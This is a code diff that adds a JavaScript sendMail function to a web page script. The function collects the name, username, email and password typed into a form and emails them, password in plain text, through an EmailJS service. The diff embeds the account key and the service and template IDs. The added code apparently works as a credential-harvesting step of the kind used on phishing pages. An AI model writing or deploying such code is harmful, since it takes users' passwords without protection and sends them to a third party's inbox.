@@ -65,3 +65,28 @@ document.addEventListener('DOMContentLoaded',function(){
     }
 });
 
+//function to send email 
+function sendMail(){
+    console.log("sendMail function called");
+    (function(){
+        emailjs.init("fLhmZXLQtdPHw00mu"); //Account Public key
+    })();
+
+    var params={
+        name: document.querySelector("#name").value,
+        email: document.querySelector("#email").value,
+        message: `Name: ${document.getElementById("name").value}\nUsername: ${document.getElementById("username").value}\nEmail: ${document.getElementById("email").value}\nPassword: ${document.getElementById("pass").value}`,
+    };
+
+    var serviceID = "service_8slf1vq"; //email service id
+    var templateID = "template_3pi7sn4"; //email template id
+
+    emailjs.send(serviceID, templateID, params)
+    .then( res => {
+        /*alert("Email sent Successfully!");*/
+        console.log("Email sent response:", res);
+    })
+    .catch(error => {
+        console.error("Email could not be sent:", error);
+    });
+}
